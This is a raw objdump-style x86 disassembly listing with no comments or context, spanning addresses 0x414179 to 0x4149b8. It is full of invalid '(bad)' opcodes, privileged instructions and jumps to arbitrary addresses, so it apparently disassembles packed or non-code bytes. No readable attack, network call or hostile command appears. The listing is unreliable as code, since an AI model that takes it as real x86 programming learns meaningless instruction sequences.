  414179:	sub    DWORD PTR [ecx],0xfffffff8
  41417c:	add    BYTE PTR [ebp-0x75],ah
  41417f:	add    BYTE PTR [eax],bl
  414181:	enter  0x894d,0x8b
  414185:	int3   
  414186:	loopne 0x41414a
  414188:	rol    BYTE PTR [eax],0x33
  41418b:	lea    cx,[ebp+0xa]
  41418f:	data16 jb 0x4141d7
  414192:	add    BYTE PTR [ebx+0x44890855],cl
  414198:	sbb    ah,al
  41419a:	inc    ebp
  41419b:	lldt   WORD PTR ds:[edx+0x66]
  4141a0:	xor    ecx,DWORD PTR [eax]
  4141a2:	sub    eax,DWORD PTR [ebx+ecx*4]
  4141a5:	add    BYTE PTR [esi+eiz*2],cl
  4141a8:	ror    edx,cl
  4141aa:	dec    ebp
  4141ab:	inc    ebp
  4141ac:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  4141b2:	cld    
  4141b3:	or     BYTE PTR [edi+0x4501dd],dl
  4141b9:	(bad)  
  4141ba:	into   
  4141bb:	out    dx,al
  4141bc:	retf   
  4141bd:	(bad)  
  4141be:	dec    ebp
  4141bf:	mov    al,0x8b
  4141c1:	loop   0x4141e3
  4141c3:	cmp    ecx,DWORD PTR [edx]
  4141c5:	inc    ebp
  4141c6:	daa    
  4141c7:	loop   0x414150
  4141c9:	out    dx,al
  4141ca:	add    edi,eax
  4141cc:	add    BYTE PTR [eax+0x3f52e155],bh
  4141d2:	push   ebp
  4141d3:	inc    ebp
  4141d4:	xor    ebx,esp
  4141d6:	add    ebp,esi
  4141d8:	push   edx
  4141d9:	push   bp
  4141db:	inc    ebp
  4141dc:	(bad)  
  4141dd:	in     eax,dx
  4141de:	push   esp
  4141df:	(bad)  
  4141e0:	inc    edx
  4141e2:	sbb    al,0x33
  4141e4:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4141eb:	add    BYTE PTR [ebp+0x47],0x8b
  4141ef:	jmp    0xf98b:0x100041c8
  4141f6:	xor    esi,DWORD PTR [edx+0x3]
  4141f9:	mov    ecx,DWORD PTR [edi]
  4141fb:	fmul   DWORD PTR [edx]
  4141fd:	add    BYTE PTR [eax],al
  4141ff:	lea    eax,[ebx-0x4700273c]
  414205:	add    al,0x4f
  414207:	pop    DWORD PTR [eax]
  414209:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  41420f:	push   edx
  414210:	inc    WORD PTR [ebp+0x8]
  414214:	mov    eax,0x514f4d
  414219:	(bad)
  41421d:	add    al,al
  41421f:	xor    DWORD PTR [ebx-0x74baf730],eax
  414225:	test   DWORD PTR [esi+0x74],esp
  414228:	inc    ebp
  414229:	mov    DWORD PTR [eax+0xa4e08],edi
  41422f:	add    BYTE PTR [ecx-0x76c435bb],cl
  414235:	or     dh,cl
  414237:	or     eax,0x8b8d5045
  41423c:	inc    ebp
  41423d:	mov    WORD PTR [ecx+0x3b8a00],?
  414243:	jne    0x414278
  414245:	mov    edi,DWORD PTR [edx+0x8f3b18]
  41424b:	add    DWORD PTR [ebx],eax
  41424d:	add    bh,bh
  41424f:	adc    DWORD PTR [eax],ecx
  414251:	adc    DWORD PTR [ebp+0x55],edi
  414254:	push   es
  414255:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  41425b:	mov    ebp,DWORD PTR [eax+ebp*1+0x503a11dc]
  414262:	inc    ebp
  414263:	mov    esp,edi
  414265:	or     al,0xdc
  414267:	push   eax
  414268:	(bad)  
  414269:	jne    0x41421f
  41426b:	call   0x393b5c
  414270:	inc    ebp
  414271:	sar    BYTE PTR [edx],0x84
  414274:	out    dx,al
  414275:	add    bh,al
  414277:	add    BYTE PTR [ebp+esi*2-0x247424],bh
  41427e:	(bad)  
  41427f:	and    al,al
  414281:	fs in  eax,dx
  414283:	inc    DWORD PTR [ebp-0x7b]
  414286:	jo     0x414297
  414288:	leave  
  414289:	scas   al,BYTE PTR es:[edi]
  41428a:	inc    esp
  41428b:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  414292:	or     BYTE PTR [ebx-0x97717c9],0x83
  414299:	call   DWORD PTR [edi]
  41429b:	shr    ah,0x84
  41429e:	xchg   DWORD PTR [eax],eax
  4142a0:	add    DWORD PTR [eax],eax
  4142a2:	add    bh,bh
  4142a4:	dec    ebp
  4142a5:	and    BYTE PTR [ecx-0x38],dl
  4142a8:	push   eax
  4142a9:	dec    DWORD PTR [ebx+0xfd885]
  4142af:	mov    BYTE PTR [ebp+0x508bac00],cl
  4142b5:	mov    WORD PTR [ecx+0x0],ss
  4142b8:	lea    ecx,[ebx+0x108b20d8]
  4142be:	mov    WORD PTR [edx],ds
  4142c0:	add    BYTE PTR [edi+0xff01ff],al
  4142c6:	mov    ecx,DWORD PTR [ebp-0x28]
  4142c9:	push   ecx
  4142ca:	shl    BYTE PTR [ebp+0x3a],0x8b
  4142ce:	inc    ebp
  4142cf:	in     al,0xeb
  4142d1:	jno    0x41425e
  4142d3:	push   edx
  4142d4:	mov    DWORD PTR [eax-0x28],edx
  4142d7:	mov    eax,DWORD PTR [ebp+0x20]
  4142da:	je     0x414263
  4142dc:	mov    eax,DWORD PTR [ecx]
  4142de:	sbb    BYTE PTR [eax],al
  4142e0:	pop    DWORD PTR [eax]
  4142e2:	add    esi,eax
  4142e4:	add    bl,al
  4142e6:	adc    DWORD PTR [edi],esi
  4142e8:	jmp    0x8bcc933a
  4142ed:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  4142f4:	jne    0x414281
  4142f6:	mov    ecx,DWORD PTR [eax]
  4142f8:	in     al,0x75
  4142fa:	pop    DWORD PTR [ecx+0x5501]
  414300:	push   edx
  414301:	inc    DWORD PTR [ebx]
  414303:	adc    BYTE PTR [ecx+0x45721cc6],cl
  414309:	add    BYTE PTR [edi+0x9],dl
  41430c:	call   DWORD PTR [esi]
  41430e:	and    dl,al
  414310:	and    bh,bh
  414312:	inc    edi
  414314:	test   eax,edx
  414316:	sldt   ebx
  414319:	xor    BYTE PTR [eax],al
  41431b:	pushf  
  41431c:	(bad)  
  41431d:	jmp    0x41432b
  41431f:	mov    eax,edi
  414321:	or     al,0x75
  414323:	inc    eax
  414324:	call   0x413a2c
  414329:	mov    eax,eax
  41432b:	loopne 0x4142b1
  41432d:	inc    ebp
  41432e:	add    BYTE PTR [ebx+0x1451c00],cl
  414334:	mov    eax,DWORD PTR [ebp+0x20]
  414337:	add    edi,ecx
  414339:	add    BYTE PTR [eax],ch
  41433b:	cmp    edi,0x18
  41433e:	test   DWORD PTR [ebp+0xf],esi
  414341:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  414348:	jne    0x41434c
  41434a:	call   0xffa03e0f
  41434f:	leave  
  414350:	rcr    BYTE PTR [esp+eax*4],0x55
  414354:	add    ah,ch
  414356:	add    BYTE PTR [edi-0x48fef979],dh
  41435c:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  414363:	inc    esp
  414364:	mov    ebx,DWORD PTR [eax]
  414366:	fcom   st(2)
  414368:	add    BYTE PTR [edi],bl
  41436a:	lea    ecx,[eax-0x18]
  41436d:	(bad)  
  41436e:	push   DWORD PTR [ecx]
  414370:	call   0xffb390d2
  414375:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  414379:	fstp   DWORD PTR [esi+ebx*8]
  41437c:	push   ebp
  41437d:	pop    ebp
  41437e:	mov    esi,DWORD PTR [edx-0x38]
  414381:	add    DWORD PTR [eax],0x28
  414384:	mov    edi,DWORD PTR [ebx]
  414386:	xor    esi,DWORD PTR [edx+0x3]
  414389:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  41438d:	pop    ebp
  41438e:	or     al,0x4
  414390:	inc    ecx
  414391:	push   ebp
  414392:	(bad)  
  414393:	in     al,dx
  414394:	or     ah,ch
  414396:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414397:	xbegin 0xffc6b98d
  41439d:	clc    
  41439e:	adc    al,0x45
  4143a0:	div    BYTE PTR [eax]
  4143a2:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  4143a9:	test   DWORD PTR [eax+edi*8+0x666300],ebx
  4143b0:	jno    0x414418
  4143b2:	add    eax,DWORD PTR [ebp+0x52]
  4143b5:	adc    eax,0xffffffa0
  4143b8:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  4143be:	test   DWORD PTR [eax],eax
  4143c0:	clc    
  4143c1:	data16 or al,BYTE PTR [ebp+0x45]
  4143c5:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4143cc:	rol    BYTE PTR [ebp+0x45],1
  4143cf:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4143d5:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4143db:	push   ebx
  4143dc:	add    BYTE PTR [ebp+0x0],dl
  4143df:	push   ecx
  4143e0:	jge    0x414415
  4143e2:	add    BYTE PTR [esi+0x4],dl
  4143e5:	jne    0x41444c
  4143e7:	mov    edx,0x457200
  4143ec:	jmp    0x4143b0
  4143ee:	xor    edi,DWORD PTR [ebx]
  4143f0:	pop    edi
  4143f1:	cvtdq2ps xmm7,xmm0
  4143f4:	ret    0x0
  4143f7:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4143fd:	xor    ecx,DWORD PTR [edi]
  4143ff:	add    eax,DWORD PTR [ecx+0x3b]
  414402:	push   ebx
  414403:	rdpmc  
  414405:	out    0x8d,al
  414407:	add    BYTE PTR [eax],cl
  414409:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  41440f:	ret    0x450c
  414412:	sbb    al,0x8b
  414414:	cmp    eax,esi
  414416:	or     cl,al
  414418:	or     al,0xc2
  41441a:	pop    eax
  41441b:	inc    ebp
  41441c:	add    ecx,DWORD PTR [edi]
  41441e:	add    esi,DWORD PTR [ebp+0x39]
  414421:	invd   
  414423:	jge    0x41442f
  414425:	mov    eax,0x478ac0
  41442a:	cli    
  41442b:	xor    esp,ecx
  41442d:	mov    ebx,0x5b8ac0
  414432:	ret    0x33
  414435:	mov    eax,0x833b8b
  41443a:	sub    BYTE PTR [ebx],al
  41443c:	inc    ebp
  41443d:	xor    ax,di
  414440:	pushf  
  414441:	inc    bh
  414443:	mov    esp,esp
  414445:	hlt    
  414446:	test   DWORD PTR [ebp-0x8],esi
  414449:	mov    eax,DWORD PTR [ebp-0x14]
  41444c:	xor    ecx,DWORD PTR [ebx-0x76478864]
  414452:	dec    edi
  414453:	or     BYTE PTR [eax],al
  414455:	jne    0x4143e0
  414457:	mov    esi,esp
  414459:	call   0x77a7d01e
  41445e:	inc    ebp
  41445f:	mov    DWORD PTR [eax+0x9c4f0c],edi
  414465:	add    BYTE PTR [ecx-0x3ffe0717],cl
  41446b:	add    BYTE PTR [esi+0x7d],ah
  41446e:	inc    ebp
  41446f:	mov    bx,WORD PTR [ebp+0x8]
  414473:	add    DWORD PTR [ebp+0x55],0x30c008b
  41447a:	inc    ebp
  41447b:	mov    bx,di
  41447e:	lock test BYTE PTR [ecx+0x7000801],bh
  414485:	jge    0x414448
  414487:	mov    ecx,DWORD PTR [ebx-0x630613f0]
  41448d:	cli    
  41448e:	xor    bl,bh
  414490:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  414496:	test   BYTE PTR [eax],cl
  414498:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  41449f:	cmp    ebp,eax
  4144a1:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  4144a8:	test   BYTE PTR [ebp+0x1],bh
  4144ab:	mov    ebx,0x458a00
  4144b0:	xor    esi,DWORD PTR [ebx]
  4144b2:	add    esp,DWORD PTR [esi-0x77]
  4144b5:	pop    ebp
  4144b6:	loopne 0x41451e
  4144b8:	inc    ebp
  4144b9:	clc    
  4144ba:	xor    edi,DWORD PTR [ebx]
  4144bc:	add    esi,DWORD PTR [edx-0x77]
  4144bf:	data16 fdivr QWORD PTR [ebp-0x49]
  4144c3:	mov    ebx,0xb78afc
  4144c8:	hlt    
  4144c9:	xor    edi,DWORD PTR [esi]
  4144cb:	data16 add BYTE PTR [ebp+0x66],bl
  4144cf:	data16 lock clc 
  4144d2:	cmp    eax,DWORD PTR ds:[eax]
  4144d5:	ja     0x41453d
  4144d7:	psubq  mm7,QWORD PTR [ebp+0x4]
  4144db:	ltr    WORD PTR [ebp+0x66]
  4144df:	add    esi,eax
  4144e1:	add    di,WORD PTR [ebp+0x2b]
  4144e5:	data16 data16 jge 0x414566
  4144e9:	mov    ebx,0xe08a8b
  4144ee:	jge    0x414523
  4144f0:	data16 data16 xor al,0x5d
  4144f4:	data16 data16 jne 0x4144f0
  4144f8:	mov    edi,DWORD PTR [ebx]
  4144fa:	fdiv   QWORD PTR [edx+0x7d]
  4144fd:	data16 data16 jge 0x414535
  414501:	mov    ebx,0x758a66
  414506:	mov    esi,0x667233
  41450b:	pop    ebp
  41450c:	or     BYTE PTR [esi+0x0],ah
  41450f:	clc    
  414510:	mov    edi,DWORD PTR [ebx]
  414512:	lock ja 0x4144a0
  414515:	(bad)  
  414517:	jge    0x414510
  414519:	invd   
  41451b:	pop    ebp
  41451c:	add    BYTE PTR [ebx],al
  41451e:	(bad)  
  41451f:	cmp    di,WORD PTR [ebp+0xf]
  414523:	data16 sbb bh,BYTE PTR [ebp+0x0]
  414527:	mov    bx,WORD PTR [ebp-0x10]
  41452b:	pop    bp
  41452d:	fbstp  TBYTE PTR [ebx]
  41452f:	test   DWORD PTR [ebx],eax
  414531:	add    BYTE PTR [ebx],bh
  414533:	add    BYTE PTR [esi+0x7d],ah
  414536:	jge    0x4144c3
  414538:	data16 in al,dx
  41453a:	pop    ebp
  41453b:	stc    
  41453c:	bsf    ecx,DWORD PTR [ebp+0x6632009c]
  414543:	mov    edi,ebx
  414545:	in     al,dx
  414546:	test   BYTE PTR [ebp+0x0],bh
  414549:	mov    eax,DWORD PTR [eax]
  41454b:	call   0xbd3e3edb
  414550:	ds pushf 
  414552:	add    BYTE PTR [edx],dh
  414554:	mov    bx,di
  414557:	call   0x8b49c2e7
  41455c:	add    ebp,esp
  41455e:	mov    bx,di
  414561:	jnp    0x414589
  414563:	mov    DWORD PTR [ebx+0x3e7df808],ecx
  414569:	mov    eax,DWORD PTR [eax]
  41456b:	call   0x7c3cd0d6
  414570:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  414576:	data16 data16 fistp WORD PTR [ebp+0xe]
  41457b:	xor    DWORD PTR [edi-0x48fff7ab],0xfb66f403
  414585:	fisttp WORD PTR [ecx-0x7401f77b]
  41458b:	(bad)  
  41458c:	cld    
  41458d:	jne    0x4145cd
  41458f:	xor    eax,DWORD PTR [eax]
  414591:	mov    esp,DWORD PTR [esi-0x10]
  414594:	sti    
  414595:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  41459c:	data16 adc bl,bh
  41459f:	push   ebp
  4145a0:	xor    ecx,DWORD PTR es:[ebx+0x3ee4f88b]
  4145a7:	mov    WORD PTR [eax],es
  4145a9:	pushf  
  4145aa:	data16 xor bh,bl
  4145ad:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  4145b3:	mov    esp,DWORD PTR [esi-0x14]
  4145b6:	fisttp WORD PTR [ebx-0x3748a9f2]
  4145bc:	or     al,0x2b
  4145be:	mov    bh,0xba
  4145c0:	hlt    
  4145c1:	mov    bh,bl
  4145c3:	add    BYTE PTR [ecx-0x7446f3cd],cl
  4145c9:	dec    esi
  4145ca:	or     al,0x0
  4145cc:	mov    edi,DWORD PTR [ebx]
  4145ce:	or     BYTE PTR [ebp+0x3b],dh
  4145d1:	mov    ecx,DWORD PTR [edi]
  4145d3:	fdivr  QWORD PTR [ebx-0x7499ff83]
  4145d9:	xor    al,0xd8
  4145db:	pop    bp
  4145dd:	lock xor esi,DWORD PTR [ebx]
  4145e0:	lea    esp,[esi+0x1f]
  4145e3:	icebp  
  4145e4:	jb     0x4145ea
  4145e6:	add    al,al
  4145e8:	jge    0x4145f6
  4145ea:	mov    eax,eax
  4145ec:	fsubr  st,st(3)
  4145ee:	pop    ebp
  4145ef:	mov    esi,DWORD PTR [ebx]
  4145f1:	in     al,0x8d
  4145f3:	rcr    DWORD PTR [edi],0xc2
  4145f6:	jb     0x414656
  4145f8:	add    cl,cl
  4145fa:	jge    0x414608
  4145fc:	mov    edx,DWORD PTR [ebp-0x20]
  4145ff:	in     al,dx
  414600:	pop    ebp
  414601:	data16 data16 or BYTE PTR [esi+edi*4],bh
  414606:	cmp    di,WORD PTR [ebp+0x0]
  41460a:	mov    ebp,DWORD PTR [ebx]
  41460c:	fdivr  QWORD PTR [esi+0x668a5d]
  414612:	cmp    al,0x33
  414614:	mov    si,0x4e7d
  414618:	mov    eax,DWORD PTR [eax]
  41461a:	lock inc ebp
  41461c:	mov    esi,DWORD PTR [esi]
  41461e:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  414625:	clc    
  414626:	(bad)  
  414627:	cmp    edi,DWORD PTR [ebx]
  414629:	je     0x41463a
  41462b:	push   ebx
  41462c:	loopne 0x41463d
  41462e:	dec    ecx
  414630:	mov    esp,DWORD PTR [esp+eiz*8-0x33]
  414634:	icebp  
  414635:	mov    esi,0x703084d
  41463a:	pcmpgtd mm6,mm1
  41463d:	add    BYTE PTR [ebp+0x66],dh
  414640:	jmp    0x41460d
  414642:	mov    eax,DWORD PTR [ebx]
  414644:	lock push ebp
  414646:	ror    DWORD PTR [ebp-0x2972feb3],1
  41464c:	or     bh,dl
  41464e:	jb     0x41464e
  414650:	add    BYTE PTR [ebx-0x1a7487b3],cl
  414656:	loopne 0x414658
  414658:	jne    0x41465e
  41465a:	data16 add BYTE PTR [esi+eiz*2],dh
  41465e:	mov    ecx,ebx
  414660:	data16 ds icebp 
  414663:	add    BYTE PTR [esi],bh
  414665:	data16 add bl,cl
  414668:	retw   0xf2
  41466c:	ret    0x66
  41466f:	retf   
  414670:	enterw 0x4df1,0x19
  414675:	pop    edi
  414676:	jne    0x4145f9
  414678:	mov    esi,DWORD PTR [esi]
  41467a:	call   0x77b5d21b
  41467f:	xor    ebp,DWORD PTR [ebx]
  414681:	lea    esp,[esi+0x48]
  414684:	repnz in eax,0x3b
  414687:	add    BYTE PTR [ebp-0x37],dh
  41468a:	xor    edx,DWORD PTR [ebp-0x15]
  41468d:	in     al,dx
  41468e:	xor    edx,DWORD PTR [esi+0x40]
  414691:	mov    DWORD PTR [edi],0x338545fc
  414697:	clc    
  414698:	add    esi,DWORD PTR [ecx]
  41469a:	pop    edi
  41469b:	pushf  
  41469c:	pop    ebx
  41469d:	call   0xff424664
  4146a2:	mov    edi,eax
  4146a4:	push   ecx
  4146a5:	pop    es
  4146a6:	mov    esi,DWORD PTR [edi]
  4146a8:	push   esi
  4146a9:	inc    edi
  4146aa:	add    al,0x70
  4146ac:	add    BYTE PTR [ecx+0x66],ah
  4146af:	(bad)  
  4146b0:	into   
  4146b1:	fs ds int 0x0
  4146b5:	mov    ecx,0x7ce0866
  4146ba:	ret    0x66
  4146bd:	add    bh,al
  4146bf:	add    al,0xfc
  4146c1:	add    BYTE PTR [ebp+0x31c3f866],al
  4146c7:	ds pushf 
  4146c9:	add    BYTE PTR [esi+0x66],ah
  4146cc:	into   
  4146cd:	ret    
  4146ce:	pop    ebp
  4146cf:	adc    al,0x57
  4146d1:	add    BYTE PTR [edi-0x723c409a],dh
  4146d7:	add    edi,edi
  4146d9:	jne    0x414730
  4146db:	lea    edx,[ecx+0x1]
  4146de:	mov    ebx,0xd64ff1
  4146e3:	sar    DWORD PTR [ebx],1
  4146e5:	test   BYTE PTR [ebp+0x38],dh
  4146e8:	mov    DWORD PTR [esp+edi*8-0x76],esp
  4146ec:	push   edi
  4146ed:	xor    BYTE PTR [ebx],0x37
  4146f0:	mov    esi,ebx
  4146f2:	xor    eax,DWORD PTR [eax-0x3c738f9a]
  4146f8:	cmp    BYTE PTR [ebp+0x64],al
  4146fb:	pop    ebx
  4146fc:	mov    ebx,0x9c3b36
  414701:	je     0x41472e
  414703:	xor    edi,DWORD PTR [ebx+0x668a33]
  414709:	mov    WORD PTR [ebx],?
  41470b:	cmp    BYTE PTR [ebx+0x8b4e64],bh
  414711:	pop    edi
  414712:	cmp    ecx,ecx
  414714:	jne    0x41476b
  414716:	mov    ebp,esp
  414718:	cld    
  414719:	push   esi
  41471a:	pop    ebx
  41471b:	inc    ebp
  41471c:	stc    
  41471d:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  414725:	clc    
  414726:	test   dl,dl
  414728:	cmp    bh,bh
  41472a:	fs pop si
  41472d:	or     bl,al
  41472f:	add    al,0x8b
  414731:	add    BYTE PTR [ecx+0x66],dl
  414734:	push   edi
  414735:	retf   0x3e45
  414738:	add    BYTE PTR ss:[esi+eiz*2-0x3d7a3542],bl
  414740:	clc    
  414741:	add    BYTE PTR [ebx+0x66],bl
  414744:	dec    edx
  414746:	mov    edx,DWORD PTR [edi-0x76]
  414749:	push   edi
  41474a:	add    al,0xb7
  41474c:	xor    al,0xba
  41474e:	cmp    al,0x8d
  414750:	je     0x414751
  414752:	mov    edx,DWORD PTR [ebp-0x46]
  414755:	push   ecx
  414756:	lea    edi,[ebx+0x554fff]
  41475c:	push   ecx
  41475d:	cmp    edx,DWORD PTR [ebx+0x75]
  414760:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  414766:	add    BYTE PTR [ebx],dh
  414768:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  41476e:	add    BYTE PTR [ebx+esi*1+0x4f64bb38],cl
  414775:	mov    ebx,0x3b3b00
  41477a:	jne    0x4147a7
  41477c:	mov    DWORD PTR [ebx+0x728afc],edi
  414782:	xor    esi,DWORD PTR [ebx]
  414784:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  41478a:	push   edi
  41478b:	cmp    esp,ebp
  41478d:	jne    0x41478f
  41478f:	sbb    DWORD PTR [eax],0x8085c3fc
  414795:	clc    
  414796:	inc    edi
  414797:	pop    ebx
  414798:	sti    
  414799:	add    eax,0xeb8bc075
  41479e:	cld    
  41479f:	xor    edi,DWORD PTR ds:0xf8c3855e
  4147a5:	mov    ecx,DWORD PTR [ecx+edx*2]
  4147a8:	rol    DWORD PTR [ebp-0x37],0xf
  4147ac:	mov    DWORD PTR [eax],ecx
  4147ae:	inc    edi
  4147af:	(bad)  
  4147b0:	in     eax,0xfc
  4147b2:	add    bh,bh
  4147b4:	(bad)  
  4147b5:	mov    esi,0xc38a5e
  4147ba:	mov    esi,DWORD PTR [ebx]
  4147bc:	push   ecx
  4147bd:	mov    edi,0xfc4ec7
  4147c2:	test   DWORD PTR [ebp-0x8],edx
  4147c5:	xor    di,ax
  4147c8:	pushf  
  4147c9:	sub    ebp,eax
  4147cb:	inc    ebp
  4147cc:	(bad)  
  4147cd:	sub    edi,edi
  4147cf:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  4147d5:	inc    ebp
  4147d6:	add    BYTE PTR [esi+0x2b],ah
  4147d9:	or     bh,BYTE PTR [edx+0xf8ac2]
  4147df:	cmp    al,0x33
  4147e1:	mov    edi,DWORD PTR [edx+0xfc4e81]
  4147e7:	(bad)  
  4147e8:	cmp    esi,DWORD PTR [ebx]
  4147ea:	je     0x4147a4
  4147ec:	push   ebx
  4147ed:	dec    esi
  4147ee:	str    ecx
  4147f1:	cmp    esp,DWORD PTR [ebp+esi*2-0x33]
  4147f5:	xor    edi,DWORD PTR [edi+0x789085f]
  4147fb:	mov    edx,DWORD PTR [esp+edi*8]
  4147fe:	add    cl,cl
  414800:	data16 add al,0xcb
  414803:	push   ebp
  414804:	add    ebp,esp
  414806:	jne    0x4147f4
  414808:	(bad)  
  414809:	mov    DWORD PTR [ecx],0xd685f7ec
  41480f:	clc    
  414810:	xlat   BYTE PTR ds:[ebx]
  414811:	inc    ebp
  414812:	mov    esi,DWORD PTR [eax]
  414814:	push   eax
  414815:	pushf  
  414816:	in     eax,0x8b
  414818:	add    ah,ch
  41481a:	add    al,0x55
  41481c:	add    BYTE PTR [ecx+0x66],dl
  41481f:	add    eax,0x3e72cb
  414824:	add    BYTE PTR [ebp+0x66],al
  414827:	(bad)  
  414828:	retf   
  414829:	lock ret 0x85
  41482d:	clc    
  41482e:	inc    bp
  414830:	retf   
  414831:	cmp    eax,0xc77d9cc8
  414836:	ss cld 
  414838:	pushf  
  414839:	test   DWORD PTR [edi-0x8],ebx
  41483c:	je     0x414883
  41483e:	xor    esi,DWORD PTR ds:0x7020840
  414844:	ror    BYTE PTR [ebp-0x37],0x8d
  414848:	push   ebp
  414849:	add    esp,ebp
  41484b:	jb     0x4147d8
  41484d:	add    BYTE PTR [eax],cl
  41484f:	dec    ebp
  414850:	mov    bh,0x81
  414852:	push   esi
  414853:	push   ebp
  414854:	adc    DWORD PTR [ecx-0x3c],0x3e9cff81
  41485b:	xor    al,BYTE PTR [eax]
  41485d:	mov    edx,DWORD PTR [edi+0x10]
  414860:	(bad)  
  414861:	scas   eax,DWORD PTR es:[edi]
  414862:	ret    0x3b
  414865:	jns    0x3b424558
  41486b:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  41486f:	dec    ebp
  414870:	or     BYTE PTR [ebx],ch
  414872:	ret    0x458b
  414875:	lock jmp 0x414869
  414878:	mov    ecx,DWORD PTR [eax]
  41487a:	or     BYTE PTR [edi],al
  41487c:	mov    ecx,eax
  41487e:	xor    DWORD PTR [edx+0x2],0x0
  414882:	mov    bh,0xc1
  414884:	adc    BYTE PTR [eax],dh
  414886:	iret   
  414887:	inc    ebp
  414888:	mov    DWORD PTR [ebx],0x4dfff8c4
  41488e:	inc    BYTE PTR [ebx]
  414890:	ret    0xf8
  414893:	adc    DWORD PTR [esi+0x10],esp
  414896:	clc    
  414897:	dec    ecx
  414898:	fisttp WORD PTR [ecx+0x456604c0]
  41489e:	add    dh,BYTE PTR ds:0x75e0845
  4148a4:	ret    0x4d
  4148a7:	lea    ecx,[ebx+0x18728301]
  4148ad:	add    BYTE PTR [ebp+0x45],al
  4148b0:	xor    ecx,ebp
  4148b2:	pushf  
  4148b3:	add    bh,al
  4148b5:	add    al,ch
  4148b7:	inc    ebp
  4148b8:	test   DWORD PTR [ebx-0x3eba0708],ecx
  4148be:	xor    eax,0x781084d
  4148c3:	push   ebp
  4148c4:	pushf  
  4148c5:	push   ecx
  4148c6:	xor    al,BYTE PTR [ecx+0x32f89c89]
  4148cc:	inc    ebp
  4148cd:	cmp    edi,DWORD PTR [ecx]
  4148cf:	jbe    0x41486d
  4148d1:	mov    eax,edi
  4148d3:	or     ah,dh
  4148d5:	inc    ebp
  4148d6:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  4148dc:	xor    ecx,DWORD PTR [ebx-0x74747664]
  4148e2:	in     al,dx
  4148e3:	hlt    
  4148e4:	push   ebp
  4148e5:	push   ebp
  4148e6:	push   ecx
  4148e7:	push   ecx
  4148e8:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  4148ee:	pushf  
  4148ef:	pushf  
  4148f0:	xor    dh,BYTE PTR [edx]
  4148f2:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  4148f8:	or     BYTE PTR [ebp+0x7],al
  4148fb:	mov    eax,ecx
  4148fd:	clc    
  4148fe:	jb     0x4148c1
  414900:	add    BYTE PTR [ebp+0x55],cl
  414903:	or     DWORD PTR [edi],0xc251d155
  414909:	add    DWORD PTR [ebx+0x32009c],0x8b76453b
  414913:	mov    edi,eax
  414915:	or     cl,al
  414917:	inc    ebp
  414918:	dec    ebp
  414919:	mov    eax,DWORD PTR [ecx+0x514d550c]
  41491f:	or     WORD PTR [ecx],0x899c
  414924:	xor    cl,BYTE PTR [ebx+0x5576fc3b]
  41492a:	mov    edx,DWORD PTR [ecx+0x8]
  41492d:	mov    eax,DWORD PTR [ebp-0x8]
  414930:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb264]
  414937:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  41493d:	inc    ebp
  41493e:	dec    eax
  41493f:	add    ecx,DWORD PTR [ebx+0x554df0f8]
  414945:	add    edx,DWORD PTR [ecx-0x8]
  414948:	mov    ecx,DWORD PTR [ecx]
  41494a:	clc    
  41494b:	or     BYTE PTR [ebp+eax*2+0x4532409c],al
  414952:	mov    ecx,ebp
  414954:	clc    
  414955:	(bad)  
  414956:	popf   
  414957:	inc    DWORD PTR [eax]
  414959:	ret    0x8b
  41495c:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  414962:	mov    edi,esp
  414964:	hlt    
  414965:	test   ecx,esi
  414967:	clc    
  414968:	or     BYTE PTR [ebp+0x7],al
  41496b:	xor    cl,al
  41496d:	pushf  
  41496e:	jb     0x4149a3
  414970:	add    BYTE PTR [eax-0x3f],al
  414973:	inc    eax
  414974:	daa    
  414975:	inc    ebp
  414976:	inc    ebp
  414977:	xor    eax,0x7f80803
  41497c:	dec    ebp
  41497d:	pushf  
  41497e:	add    esi,DWORD PTR [edx]
  414980:	clc    
  414981:	cmp    DWORD PTR [ecx],ecx
  414983:	or     al,0x8
  414985:	add    al,BYTE PTR [ebp+0x2c]
  414988:	xor    eax,0x7350845
  41498d:	or     BYTE PTR [ebp+0x7],cl
  414990:	lea    ebx,[ecx+eax*1+0x8b7232]
  414997:	or     al,0x45
  414999:	enter  0x4deb,0x8b
  41499d:	mov    edx,DWORD PTR [eax]
  41499f:	cld    
  4149a0:	dec    ebp
  4149a1:	push   ebp
  4149a2:	sub    edx,DWORD PTR [ecx-0x75]
  4149a5:	add    eax,0xf172fc
  4149aa:	or     BYTE PTR [ebp+0x7],cl
  4149ad:	add    eax,ecx
  4149af:	or     al,0x72
  4149b1:	add    DWORD PTR [eax],eax
  4149b3:	mov    ebx,0x29c2c1
  4149b8:	inc    ebp
